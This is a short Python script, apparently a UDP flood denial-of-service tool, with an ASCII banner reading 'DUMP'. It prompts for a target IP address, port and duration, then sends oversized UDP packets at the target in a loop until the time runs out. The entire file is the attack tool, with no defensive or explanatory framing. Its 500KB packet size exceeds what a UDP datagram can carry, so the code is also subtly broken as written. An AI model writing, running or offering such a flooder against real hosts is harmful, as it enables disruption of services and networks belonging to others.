import socket
import time
import random

def send_udp_packets(ip, port, duration):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        bytes_to_send = b'X' * 500000  # 500KB packet size
        start_time = time.time()
        while (time.time() - start_time) < duration:
            sock.sendto(bytes_to_send, (ip, port))
    except Exception as e:
        print(f"An error occurred: {e}")
    finally:
        sock.close()

if __name__ == "__main__":
    print("██████╗░██╗░░░██╗███╗░░░███╗██████╗░")
    print("██╔══██╗██║░░░██║████╗░████║██╔══██╗")
    print("██║░░██║██║░░░██║██╔████╔██║██████╔╝")
    print("██║░░██║██║░░░██║██║╚██╔╝██║██╔═══╝░")
    print("██████╔╝╚██████╔╝██║░╚═╝░██║██║░░░░░")
    print("╚═════╝░░╚═════╝░╚═╝░░░░░╚═╝╚═╝░░░░░")

    ip = input("Enter the IP address of the target: ")
    port = int(input("Enter the port number of the target: "))
    duration = int(input("Enter the duration to send UDP packets (in seconds): "))
    print("Sending UDP packets...")
    send_udp_packets(ip, port, duration)
    print("UDP packets sent successfully.")
